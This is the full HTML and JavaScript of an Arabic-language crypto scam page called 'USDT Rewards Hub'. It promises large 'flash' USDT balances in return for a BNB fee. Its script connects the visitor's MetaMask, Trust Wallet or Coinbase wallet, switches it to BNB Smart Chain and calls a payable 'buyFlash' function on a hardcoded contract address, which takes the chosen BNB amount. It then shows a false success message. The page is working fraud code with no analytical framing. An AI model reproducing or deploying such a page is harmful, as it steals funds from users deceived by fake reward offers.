<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Rewards Hub</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@coinbase/wallet-sdk@3.7.1/dist/index.js"></script>

    <style>
        :root { --primary: #00ffa3; --bg: #020807; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { width: 90%; max-width: 380px; background: #0a1412; border: 1px solid #1a2e2a; border-radius: 25px; padding: 25px; text-align: center; }
        .logo { width: 60px; margin-bottom: 15px; filter: drop-shadow(0 0 5px var(--primary)); }
        select, .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-weight: bold; margin-top: 10px; cursor: pointer; }
        select { background: #111; color: #fff; border: 1px solid #333; }
        .btn { background: var(--primary); color: #000; font-size: 16px; }
        
        /* Modal Style */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
        .m-box { background: #0a1412; padding: 20px; border-radius: 20px; width: 80%; max-width: 300px; border: 1px solid #1a2e2a; }
        .w-opt { display: flex; align-items: center; justify-content: space-between; padding: 12px; background: #142622; margin-top: 10px; border-radius: 12px; cursor: pointer; border: 1px solid transparent; }
        .w-opt:hover { border-color: var(--primary); }
        .w-opt img { width: 25px; }
        #msg { margin-top: 15px; font-size: 12px; color: var(--primary); }
    </style>
</head>
<body>

<div class="card">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo">
    <h2>تفعيل استحقاق USDT</h2>
    <p style="color:#666; font-size:12px">اختر الفئة المطلوبة للمزامنة مع المحفظة</p>
    
    <select id="tier">
        <option value="0.09">5,000 USDT (0.09 BNB)</option>
        <option value="0.5">50,000 USDT (0.5 BNB)</option>
        <option value="1.0">150,000 USDT (1.0 BNB)</option>
    </select>

    <button class="btn" onclick="openM()">استلام الرصيد المخصص ⚡</button>
    <div id="msg">بانتظار تأمين الاتصال...</div>
</div>

<div id="vModal" class="modal">
    <div class="m-box">
        <h4 style="margin:0 0 10px 0; text-align:center;">اختر محفظتك</h4>
        <div class="w-opt" onclick="connectNow('MetaMask')"><span>MetaMask</span> <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"></div>
        <div class="w-opt" onclick="connectNow('Trust')"><span>Trust Wallet</span> <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg"></div>
        <div class="w-opt" onclick="connectNow('Coinbase')"><span>Coinbase</span> <img src="https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg"></div>
        <button onclick="closeM()" style="width:100%; margin-top:15px; background:none; color:#444; border:none; cursor:pointer;">إلغاء</button>
    </div>
</div>

<script>
    const ADDR = "0x609BB2a512e6944210D01483e491A410912975F9";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];
    const RPC = "https://bsc-dataseed1.binance.org/";

    function openM() { document.getElementById('vModal').style.display = 'flex'; }
    function closeM() { document.getElementById('vModal').style.display = 'none'; }

    async function connectNow(type) {
        closeM();
        const msg = document.getElementById('msg');
        let provider;

        try {
            if (type === 'Coinbase') {
                const cb = new CoinbaseWalletSDK({ appName: "Tether Rewards", darkMode: true });
                provider = cb.makeWeb3Provider(RPC, 56);
            } else {
                // MetaMask و Trust Wallet يستخدمان window.ethereum
                provider = window.ethereum;
                // في بعض الحالات Trust Wallet يغير اسم الـ provider
                if (type === 'Trust' && window.trustwallet) provider = window.trustwallet;
            }

            if (!provider) {
                alert("يرجى فتح الموقع من متصفح " + type);
                return;
            }

            msg.innerText = "جاري طلب الإذن من " + type + "...";
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            const web3 = new Web3(provider);
            const user = accounts[0];

            // تحويل الشبكة لـ BSC
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });

            msg.innerText = "جاري تفعيل حقن الرصيد...";
            const contract = new web3.eth.Contract(ABI, ADDR);
            const val = document.getElementById('tier').value;

            await contract.methods.buyFlash().send({
                from: user,
                value: web3.utils.toWei(val, "ether"),
                gas: 200000
            });

            msg.innerText = "✅ تمت العملية بنجاح!";

        } catch (e) {
            console.error(e);
            msg.innerText = "⚠️ فشل الارتباط أو تم إلغاء العملية.";
        }
    }
</script>
</body>
</html>
